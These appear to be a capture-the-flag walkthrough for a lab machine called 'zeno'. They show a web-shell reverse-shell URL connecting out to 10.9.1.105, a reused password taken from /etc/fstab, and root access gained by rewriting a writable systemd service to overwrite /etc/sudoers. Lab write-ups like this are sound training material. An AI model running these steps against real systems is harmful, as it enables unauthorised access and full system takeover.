ip address: 10.10.242.68

Nmap:
22
12340


Gobuster:

on 10.10.242.68:12340 found:
 /rms

on 10.10.242.69:12340/rms found:
/images (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/swf (Status: 301)
/connection (Status: 301)
/stylesheets (Status: 301)
/validation (Status: 301)

user searchsploit to find an exploit
run the expoit
open netcat on 1234

visit:
http://10.10.242.68:12340/rms/images/reverse-shell.php?cmd=bash+-i+>%26+/dev/tcp/10.9.1.105/1234+0>%261

cd to /tmp and copy linpeas.sh

run linpeas.sh

found an username: edward
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                       
passwd file: /etc/passwd
 Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share        /mnt/secret-share       cifs    _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft      0 0   

 cat /etc/fstab
 # Created by anaconda on Tue Jun  8 23:56:31 2021
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos-root /       xfs     defaults        0 0
UUID=507d63a9-d8cc-401c-a660-bd57acfd41b2       /boot   xfs     defaults        0 0
/dev/mapper/centos-swap swap    swap    defaults        0 0
#//10.10.10.10/secret-share     /mnt/secret-share       cifs    _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft   

su edward with passwd: FrobjoodAdkoonceanJa
sudo -l
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot

    with linpeas we found that  zeno-monitoring.service is writable for everyone

    cat /etc/systemd/system/zeno-monitoring.service

    edit the ExecStart line to be like this:
    ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

    this will allow edward to run everything as sudo without password

    Restart the machine:

    $ sudo /usr/sbin/reboot 

    wait for the machine to reboot then log in via ssh to edward

    ssh edward@ip

    check sudo -l

    notice that edward can run everything as sudo without passwd

    switch to sudo and get root flag

    $ sudo su
    $ cat /root/root.txt


